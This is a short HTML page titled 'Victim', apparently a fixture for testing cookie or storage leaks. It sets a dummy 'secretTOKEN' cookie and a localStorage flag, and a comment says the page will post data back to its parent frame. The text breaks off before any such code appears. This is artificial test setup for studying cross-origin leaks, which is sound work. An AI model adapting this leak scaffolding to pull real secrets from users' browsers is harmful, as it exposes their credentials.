<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Victim</title></head>
<body>

  <script>
    // 1) Define artefatos “secretos”
    document.cookie = "secretTOKEN=42; SameSite=None; Secure";
    localStorage.setItem("flag", "COOKIE_LEAK_SUCCESS");

    // 2) Ao carregar, tenta postar de volta ao parent
